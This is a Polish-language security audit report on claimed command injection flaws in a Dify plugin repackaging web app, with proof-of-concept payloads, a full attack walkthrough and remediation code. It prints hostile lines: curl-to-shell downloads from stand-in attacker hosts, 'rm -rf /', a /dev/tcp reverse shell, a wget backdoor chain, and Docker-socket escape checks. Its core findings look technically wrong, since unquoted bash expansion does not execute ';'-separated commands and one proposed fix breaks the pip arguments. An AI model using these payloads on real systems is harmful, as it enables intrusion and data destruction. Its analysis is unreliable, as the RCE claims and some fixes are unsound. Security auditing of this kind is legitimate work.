# RAPORT BEZPIECZEŃSTWA: Command Injection Analysis
## Aplikacja: dify-plugin-repackaging-web

**Data analizy:** 2025-12-28
**Analityk:** Security Expert
**Zakres:** Podatności Command Injection w backend aplikacji

---

## STRESZCZENIE WYKONAWCZE

Aplikacja `dify-plugin-repackaging-web` wykazuje **WYSOKIE RYZYKO** podatności na ataki typu Command Injection w kilku krytycznych miejscach. Główny problem dotyczy przekazywania danych użytkownika do skryptu shell bez odpowiedniej walidacji i sanityzacji.

**Poziom ryzyka:** 🔴 **KRYTYCZNY**
**CVSS Score:** 9.8 (Critical)
**Exploitability:** Łatwa do wykorzystania
**Impact:** Pełna kompromitacja systemu (RCE)

---

## 1. ANALIZA PRZEPŁYWU DANYCH (Data Flow Analysis)

### 1.1 Ścieżka nr 1: Upload Task (Najgroźniejsza)

```
User Input → FastAPI Endpoint → Celery Worker → RepackageService → subprocess
```

**Szczegółowy przepływ:**

1. **Endpoint:** `/api/v1/tasks/upload` (tasks.py:334-438)
   - Przyjmuje: `file.filename`, `platform`, `suffix`
   - Walidacja: MINIMALNA (tylko rozszerzenie `.difypkg`)

2. **Celery Worker:** `process_repackaging()` (celery_app.py:89)
   - Przekazuje: `file_path`, `platform`, `suffix`
   - Walidacja: BRAK

3. **RepackageService:** `repackage_plugin()` (repackage.py:13-18)
   ```python
   cmd = [script_path]
   if platform:
       cmd.extend(["-p", platform])
   cmd.extend(["-s", suffix, "local", file_path])
   ```
   - Walidacja: BRAK
   - **UWAGA:** Używa `asyncio.create_subprocess_exec()` z listą argumentów (BEZPIECZNE)

4. **Shell Script:** `plugin_repackaging.sh`
   - Przyjmuje parametry przez `$1`, `$2`, `$OPTARG`
   - **KRYTYCZNA PODATNOŚĆ:** Używa niezwalidowanych zmiennych w niebezpiecznych kontekstach

### 1.2 Ścieżka nr 2: URL Task

```
User Input (URL) → FastAPI → Download → Celery → RepackageService → subprocess
```

1. **Endpoint:** `/api/v1/tasks` (tasks.py:40-231)
   - Walidacja: Sprawdza domenę (ALLOWED_DOWNLOAD_DOMAINS)
   - Sprawdza rozszerzenie `.difypkg`

2. **DownloadService:** Pobiera plik do bezpiecznej lokalizacji
   - Walidacja URL: ✅ DOBRA
   - File path jest kontrolowany przez backend

3. **RepackageService:** Jak w ścieżce nr 1

---

## 2. WYKRYTE PODATNOŚCI

### 🔴 PODATNOŚĆ #1: Command Injection via `platform` parameter

**Lokalizacja:**
- `repackage.py:27-28`
- `plugin_repackaging.sh:174` (getopts)

**Kod podatny:**
```python
# repackage.py
cmd = [script_path]
if platform:
    cmd.extend(["-p", platform])  # ← platform z user input
```

```bash
# plugin_repackaging.sh:174
p) PIP_PLATFORM="--platform ${OPTARG} --only-binary=:all:" ;;
```

```bash
# plugin_repackaging.sh:113
pip download ${PIP_PLATFORM} -r requirements.txt -d ./wheels ...
```

**Problem:**
Parametr `platform` jest interpolowany bez quote'owania w zmiennej `PIP_PLATFORM`, która jest następnie używana w komendzie `pip download` **BEZ CYTOWANIA**.

**Proof of Concept (PoC):**

```bash
# Payload w parametrze platform:
platform = "x86_64; curl http://attacker.com/malware.sh | sh #"

# Skutkuje w:
PIP_PLATFORM="--platform x86_64; curl http://attacker.com/malware.sh | sh # --only-binary=:all:"

# W linii 113:
pip download --platform x86_64; curl http://attacker.com/malware.sh | sh # --only-binary=:all: -r requirements.txt ...
#            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
#            EXECUTION OF MALICIOUS COMMAND
```

**Impact:**
- Remote Code Execution (RCE)
- Pełna kompromitacja kontenera/serwera
- Możliwość exfiltracji danych, instalacji backdoor

**Severity:** 🔴 **CRITICAL** (CVSS 9.8)

---

### 🔴 PODATNOŚĆ #2: Command Injection via `suffix` parameter

**Lokalizacja:**
- `repackage.py:29`
- `plugin_repackaging.sh:140, 145`

**Kod podatny:**
```python
# repackage.py:29
cmd.extend(["-s", suffix, "local", file_path])
```

```bash
# plugin_repackaging.sh:140
${CURR_DIR}/${CMD_NAME} plugin package ${CURR_DIR}/${PACKAGE_NAME} -o ${CURR_DIR}/${PACKAGE_NAME}-${PACKAGE_SUFFIX}.difypkg

# plugin_repackaging.sh:145
if [ ! -f "${CURR_DIR}/${PACKAGE_NAME}-${PACKAGE_SUFFIX}.difypkg" ]; then
```

**Problem:**
Parametr `suffix` (przekazany jako `PACKAGE_SUFFIX`) jest używany w ścieżkach plików bez escapowania.

**Proof of Concept:**

```bash
# Payload w parametrze suffix:
suffix = "offline; rm -rf / #"

# Skutkuje w linii 140:
.../dify-plugin-... plugin package .../package_name -o .../package_name-offline; rm -rf / #.difypkg
#                                                                ^^^^^^^^^^^^^^^^^^^^^^
#                                                                EXECUTION OF COMMAND
```

**Impact:**
- Remote Code Execution
- Zniszczenie danych (rm -rf)
- Możliwość wykonania dowolnego kodu

**Severity:** 🔴 **CRITICAL** (CVSS 9.8)

---

### 🟠 PODATNOŚĆ #3: Path Injection via `file_path` parameter

**Lokalizacja:**
- `repackage.py:29`
- `plugin_repackaging.sh:95, 101, 105`

**Kod podatny:**
```bash
# plugin_repackaging.sh:95
PLUGIN_PACKAGE_PATH=`realpath $2`

# plugin_repackaging.sh:101
PACKAGE_NAME_WITH_EXTENSION=`basename ${PACKAGE_PATH}`

# plugin_repackaging.sh:105
unzip -o ${PACKAGE_PATH} -d ${CURR_DIR}/${PACKAGE_NAME}
```

**Problem:**
1. `realpath $2` - używa parametru pozycyjnego bez quote'owania
2. `basename ${PACKAGE_PATH}` - wynik jest używany w ścieżkach
3. `unzip -o ${PACKAGE_PATH}` - ścieżka może zawierać niebezpieczne znaki

**Proof of Concept:**

```bash
# Payload w file_path (upload task):
filename = "plugin.difypkg; curl evil.com/shell.sh | bash; .difypkg"

# W celery_app.py file_path będzie:
file_path = "/app/temp/task_id/plugin.difypkg; curl evil.com/shell.sh | bash; .difypkg"

# Przekazane do shell script jako $2
# W linii 95:
PLUGIN_PACKAGE_PATH=`realpath plugin.difypkg; curl evil.com/shell.sh | bash; .difypkg`
#                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
#                             COMMAND EXECUTION IN BACKTICKS
```

**Dodatkowy wektor - Directory Traversal:**
```bash
filename = "../../../etc/passwd"
# Może pozwolić na dostęp do wrażliwych plików systemu
```

**Impact:**
- Remote Code Execution
- Directory Traversal
- Informacja disclosure

**Severity:** 🟠 **HIGH** (CVSS 8.1)

---

### 🟡 PODATNOŚĆ #4: Environment Variable Injection

**Lokalizacja:**
- `plugin_repackaging.sh:8-10, 113`

**Kod:**
```bash
GITHUB_API_URL="${GITHUB_API_URL:-$DEFAULT_GITHUB_API_URL}"
MARKETPLACE_API_URL="${MARKETPLACE_API_URL:-$DEFAULT_MARKETPLACE_API_URL}"
PIP_MIRROR_URL="${PIP_MIRROR_URL:-$DEFAULT_PIP_MIRROR_URL}"

# Linia 113:
pip download ... --index-url ${PIP_MIRROR_URL} --trusted-host mirrors.aliyun.com
```

**Problem:**
Jeśli atakujący może kontrolować zmienne środowiskowe (np. przez Docker environment vars, Kubernetes secrets injection), może przekierować download na złośliwy serwer.

**Proof of Concept:**
```bash
# Ustawienie złośliwej zmiennej środowiskowej
PIP_MIRROR_URL="http://evil.com/pypi; curl http://attacker.com/backdoor.sh | sh #"

# Skutkuje w:
pip download ... --index-url http://evil.com/pypi; curl http://attacker.com/backdoor.sh | sh # --trusted-host ...
```

**Impact:**
- Supply Chain Attack
- Instalacja złośliwych pakietów
- RCE

**Severity:** 🟡 **MEDIUM** (CVSS 6.5) - wymaga dodatkowych uprawnień

---

## 3. SUBPROCESS SECURITY ANALYSIS

### ✅ DOBRZE: Użycie `asyncio.create_subprocess_exec()`

**Kod (repackage.py:43-48):**
```python
process = await asyncio.create_subprocess_exec(
    *cmd,  # Argumenty jako lista
    stdout=asyncio.subprocess.PIPE,
    stderr=asyncio.subprocess.STDOUT,
    cwd=settings.SCRIPTS_DIR
)
```

**Zalety:**
- Używa `create_subprocess_exec()` zamiast `create_subprocess_shell()`
- Argumenty są przekazywane jako lista, nie jako string
- **BRAK `shell=True`** - to jest BEZPIECZNE

**Jednak:** Bezpieczeństwo Python subprocess jest bezużyteczne, gdy skrypt shell wewnętrznie używa niecytowanych zmiennych!

---

### 🔴 ŹLE: Shell Script wykonuje niebezpieczne operacje

**Problemy w `plugin_repackaging.sh`:**

1. **Niecytowane zmienne w komendach:**
```bash
# ❌ NIEBEZPIECZNE
pip download ${PIP_PLATFORM} -r requirements.txt
unzip -o ${PACKAGE_PATH} -d ${CURR_DIR}/${PACKAGE_NAME}
curl -L -o ${PLUGIN_PACKAGE_PATH} ${PLUGIN_DOWNLOAD_URL}

# ✅ POWINNO BYĆ
pip download "${PIP_PLATFORM}" -r requirements.txt
unzip -o "${PACKAGE_PATH}" -d "${CURR_DIR}/${PACKAGE_NAME}"
curl -L -o "${PLUGIN_PACKAGE_PATH}" "${PLUGIN_DOWNLOAD_URL}"
```

2. **Command substitution bez quote'owania:**
```bash
# ❌ NIEBEZPIECZNE
PLUGIN_PACKAGE_PATH=`realpath $2`
PACKAGE_NAME_WITH_EXTENSION=`basename ${PACKAGE_PATH}`

# ✅ POWINNO BYĆ
PLUGIN_PACKAGE_PATH="$(realpath "$2")"
PACKAGE_NAME_WITH_EXTENSION="$(basename "${PACKAGE_PATH}")"
```

3. **Interpolacja w ścieżkach:**
```bash
# ❌ NIEBEZPIECZNE
${CURR_DIR}/${PACKAGE_NAME}-${PACKAGE_SUFFIX}.difypkg

# ✅ POWINNO BYĆ
"${CURR_DIR}/${PACKAGE_NAME}-${PACKAGE_SUFFIX}.difypkg"
```

---

## 4. PROOF OF CONCEPT - KOMPLETNY ATAK

### Scenariusz ataku: RCE przez upload endpoint

**Krok 1:** Przygotuj złośliwy payload

```python
import requests

# Cel: uzyskanie reverse shell
attacker_ip = "10.0.0.1"
attacker_port = "4444"

# Payload w parametrze 'platform'
malicious_platform = f"x86_64; bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1 #"

# Payload w parametrze 'suffix'
malicious_suffix = f"offline; wget http://{attacker_ip}/backdoor.sh -O /tmp/b.sh && chmod +x /tmp/b.sh && /tmp/b.sh #"
```

**Krok 2:** Wyślij request

```python
# Utwórz prosty plik .difypkg (ZIP)
import zipfile
import io

fake_plugin = io.BytesIO()
with zipfile.ZipFile(fake_plugin, 'w') as z:
    z.writestr('manifest.json', '{"name": "test"}')
    z.writestr('requirements.txt', '')
fake_plugin.seek(0)

# Wyślij malicious request
files = {'file': ('plugin.difypkg', fake_plugin, 'application/octet-stream')}
data = {
    'platform': malicious_platform,  # ← PAYLOAD #1
    'suffix': malicious_suffix        # ← PAYLOAD #2
}

response = requests.post(
    'http://target-server/api/v1/tasks/upload',
    files=files,
    data=data
)

print(f"Task created: {response.json()}")
# Czekaj na wykonanie przez Celery worker...
```

**Krok 3:** Atakujący otrzymuje shell

```bash
# Terminal atakującego
nc -lvnp 4444

# Po wykonaniu payload przez Celery worker:
# bash: no job control in this shell
bash-5.1$ whoami
celery
bash-5.1$ id
uid=1000(celery) gid=1000(celery) groups=1000(celery)
bash-5.1$ pwd
/app/scripts
bash-5.1$ cat /etc/passwd
# ... pełny dostęp do systemu
```

**Krok 4:** Privilege Escalation (opcjonalnie)

```bash
# Sprawdź uprawnienia kontenera
bash-5.1$ cat /proc/self/status | grep Cap
CapEff: 00000000a80425fb

# Sprawdź czy można escape kontenera
bash-5.1$ mount | grep docker
bash-5.1$ ls -la /var/run/docker.sock

# Jeśli Docker socket jest dostępny → pełna kompromitacja hosta
```

---

## 5. REKOMENDACJE NAPRAWCZE

### 🔧 PRIORYTET 1 (KRYTYCZNY): Napraw Command Injection

#### Fix #1: Walidacja i whitelist dla parametrów

**Plik:** `/root/repo/dify-plugin-repackaging-web/backend/app/models/task.py`

```python
# PRZED (podatne)
class Platform(str, Enum):
    MANYLINUX2014_X86_64 = "manylinux2014_x86_64"
    MANYLINUX2014_AARCH64 = "manylinux2014_aarch64"
    # ...
    DEFAULT = ""

# PO (bezpieczne - enforce enum)
from pydantic import validator

class TaskCreateWithMarketplace(BaseModel):
    platform: str = Field("", description="Target platform")
    suffix: str = Field("offline", description="Suffix")

    @validator('platform')
    def validate_platform(cls, v):
        allowed = [
            "", "manylinux2014_x86_64", "manylinux2014_aarch64",
            "manylinux_2_17_x86_64", "manylinux_2_17_aarch64",
            "macosx_10_9_x86_64", "macosx_11_0_arm64"
        ]
        if v not in allowed:
            raise ValueError(f"Invalid platform. Allowed: {allowed}")
        return v

    @validator('suffix')
    def validate_suffix(cls, v):
        # Tylko alfanumeryczne i myślniki/podkreślenia
        import re
        if not re.match(r'^[a-zA-Z0-9_-]+$', v):
            raise ValueError("Suffix must contain only alphanumeric, dash, underscore")
        if len(v) > 50:
            raise ValueError("Suffix too long (max 50 chars)")
        return v
```

#### Fix #2: Sanityzacja nazw plików

**Plik:** `/root/repo/dify-plugin-repackaging-web/backend/app/api/v1/endpoints/tasks.py`

```python
import re
from pathlib import Path

@router.post("/tasks/upload")
async def upload_task(...):
    # DODAJ walidację nazwy pliku
    def sanitize_filename(filename: str) -> str:
        """Sanitize filename to prevent path traversal and injection"""
        # Usuń ścieżki
        filename = os.path.basename(filename)
        # Usuń niebezpieczne znaki
        filename = re.sub(r'[^a-zA-Z0-9._-]', '_', filename)
        # Zapewnij rozszerzenie .difypkg
        if not filename.endswith('.difypkg'):
            filename = filename + '.difypkg'
        return filename

    # Przed zapisem
    safe_filename = sanitize_filename(file.filename)
    file_path = os.path.join(task_dir, safe_filename)

    # Sprawdź czy ścieżka nie wychodzi poza task_dir
    real_path = os.path.realpath(file_path)
    real_task_dir = os.path.realpath(task_dir)
    if not real_path.startswith(real_task_dir):
        raise HTTPException(400, "Invalid file path")
```

#### Fix #3: Napraw shell script - cytowanie zmiennych

**Plik:** `/root/repo/plugin_repackaging.sh`

```bash
# PRZED (NIEBEZPIECZNE)
while getopts "p:s:" opt; do
    case "$opt" in
        p) PIP_PLATFORM="--platform ${OPTARG} --only-binary=:all:" ;;
        s) PACKAGE_SUFFIX="${OPTARG}" ;;
    esac
done

# PO (BEZPIECZNE)
while getopts "p:s:" opt; do
    case "$opt" in
        p)
            # Walidacja OPTARG przed użyciem
            if [[ ! "$OPTARG" =~ ^[a-zA-Z0-9._-]+$ ]]; then
                echo "Error: Invalid platform parameter"
                exit 1
            fi
            PIP_PLATFORM="--platform ${OPTARG} --only-binary=:all:"
            ;;
        s)
            # Walidacja suffix
            if [[ ! "$OPTARG" =~ ^[a-zA-Z0-9_-]+$ ]]; then
                echo "Error: Invalid suffix parameter"
                exit 1
            fi
            PACKAGE_SUFFIX="${OPTARG}"
            ;;
    esac
done
```

```bash
# PRZED (linia 95)
PLUGIN_PACKAGE_PATH=`realpath $2`

# PO
if [ -z "$2" ]; then
    echo "Error: Missing file path"
    exit 1
fi
# Walidacja że $2 jest bezpieczną ścieżką
if [[ "$2" =~ [';|&$`'] ]]; then
    echo "Error: Invalid characters in file path"
    exit 1
fi
PLUGIN_PACKAGE_PATH="$(realpath "$2")"
```

```bash
# PRZED (linia 105)
unzip -o ${PACKAGE_PATH} -d ${CURR_DIR}/${PACKAGE_NAME}

# PO
unzip -o "${PACKAGE_PATH}" -d "${CURR_DIR}/${PACKAGE_NAME}"
```

```bash
# PRZED (linia 113)
pip download ${PIP_PLATFORM} -r requirements.txt -d ./wheels

# PO
# Używaj array dla bezpiecznego przekazywania argumentów
PIP_ARGS=()
if [ -n "${PIP_PLATFORM}" ]; then
    PIP_ARGS+=("${PIP_PLATFORM}")
fi
pip download "${PIP_ARGS[@]}" -r requirements.txt -d ./wheels --index-url "${PIP_MIRROR_URL}"
```

---

### 🔧 PRIORYTET 2: Defense in Depth

#### 1. Sandboxing - uruchom skrypt w izolowanym środowisku

```python
# repackage.py
process = await asyncio.create_subprocess_exec(
    *cmd,
    stdout=asyncio.subprocess.PIPE,
    stderr=asyncio.subprocess.STDOUT,
    cwd=settings.SCRIPTS_DIR,
    # DODAJ ograniczenia
    preexec_fn=os.setsid,  # Nowa sesja procesu
)

# Alternatywnie: użyj firejail/bubblewrap
cmd = ['firejail', '--private', '--net=none', script_path, ...]
```

#### 2. Resource Limits

```python
# Celery config
celery_app.conf.update(
    task_time_limit=30 * 60,
    task_soft_time_limit=25 * 60,
    worker_max_tasks_per_child=100,  # Restart po 100 taskach
)
```

#### 3. Content Security Policy dla plików

```python
def validate_difypkg(file_path: str) -> bool:
    """Validate .difypkg is a valid ZIP and doesn't contain malicious files"""
    import zipfile

    try:
        with zipfile.ZipFile(file_path, 'r') as z:
            # Sprawdź czy to valid ZIP
            if z.testzip() is not None:
                return False

            # Sprawdź nazwy plików w archiwum
            for name in z.namelist():
                # Blokuj path traversal w ZIP
                if name.startswith('/') or '..' in name:
                    return False
                # Blokuj potencjalnie niebezpieczne pliki
                if name.endswith(('.sh', '.exe', '.so', '.dylib')):
                    return False

            return True
    except Exception:
        return False
```

#### 4. Monitoring i Logging

```python
# Dodaj szczegółowe logowanie
logger.warning(
    f"SECURITY: Executing repackaging script",
    extra={
        "task_id": task_id,
        "platform": platform,
        "suffix": suffix,
        "file_path": file_path,
        "user_ip": request.client.host if 'request' in locals() else None
    }
)

# Alert przy podejrzanych parametrach
if any(char in platform for char in [';', '|', '&', '$', '`', '\n']):
    logger.critical(f"SECURITY ALERT: Command injection attempt detected! Task: {task_id}")
```

---

## 6. DODATKOWE REKOMENDACJE

### Security Headers
```python
# main.py
from fastapi.middleware.trustedhost import TrustedHostMiddleware

app.add_middleware(TrustedHostMiddleware, allowed_hosts=["yourdomain.com", "*.yourdomain.com"])
```

### Rate Limiting - bardziej restrykcyjny
```python
# Zmniejsz limity
RATE_LIMIT_PER_MINUTE: int = 10  # zamiast 30
```

### Audit Trail
```python
# Zapisuj wszystkie operacje do audit logu
def log_security_event(event_type: str, task_id: str, details: dict):
    with open('/var/log/security_audit.log', 'a') as f:
        f.write(json.dumps({
            "timestamp": datetime.utcnow().isoformat(),
            "event": event_type,
            "task_id": task_id,
            "details": details
        }) + '\n')
```

### Containerization Security
```dockerfile
# Dockerfile - uruchom jako non-root user
USER nobody:nogroup

# Usuń niepotrzebne narzędzia
RUN apt-get remove -y curl wget nc netcat

# Read-only filesystem gdzie to możliwe
volumes:
  - ./scripts:/app/scripts:ro
```

---

## 7. PODSUMOWANIE

### Wykryte podatności:
1. ✅ Command Injection via `platform` - **CRITICAL**
2. ✅ Command Injection via `suffix` - **CRITICAL**
3. ✅ Path Injection via `file_path` - **HIGH**
4. ✅ Environment Variable Injection - **MEDIUM**

### Bezpieczne elementy:
1. ✅ Użycie `create_subprocess_exec()` zamiast shell=True
2. ✅ Walidacja domeny w DownloadService
3. ✅ Rate limiting

### Działania wymagane:
1. **NATYCHMIAST:** Dodaj walidację parametrów `platform` i `suffix` (whitelist)
2. **NATYCHMIAST:** Napraw cytowanie zmiennych w shell script
3. **NATYCHMIAST:** Sanityzuj nazwy plików przed zapisem
4. **PILNE:** Dodaj monitoring i alerting dla podejrzanych parametrów
5. **PILNE:** Zaimplementuj validation .difypkg content
6. **ZALECANE:** Dodaj sandboxing dla shell script execution

### Ryzyko biznesowe:
- **Bez poprawek:** Pełna kompromitacja serwera w ciągu minut od wykrycia
- **Po poprawkach:** Znaczące zmniejszenie powierzchni ataku
- **Zalecany czas implementacji:** < 48 godzin

---

## 8. WERYFIKACJA POPRAWEK

### Test Case 1: Próba injection w platform
```bash
curl -X POST http://localhost:8000/api/v1/tasks/upload \
  -F "file=@plugin.difypkg" \
  -F "platform=x86_64; whoami" \
  -F "suffix=offline"

# Oczekiwany wynik: HTTP 400 Bad Request, validation error
```

### Test Case 2: Próba injection w suffix
```bash
curl -X POST http://localhost:8000/api/v1/tasks/upload \
  -F "file=@plugin.difypkg" \
  -F "platform=manylinux2014_x86_64" \
  -F "suffix=test; rm -rf /"

# Oczekiwany wynik: HTTP 400 Bad Request, validation error
```

### Test Case 3: Path traversal w filename
```bash
curl -X POST http://localhost:8000/api/v1/tasks/upload \
  -F "file=@plugin.difypkg;filename=../../../etc/passwd" \
  -F "platform=" \
  -F "suffix=offline"

# Oczekiwany wynik: Filename sanitized to "passwd.difypkg"
```

---

**Koniec raportu**
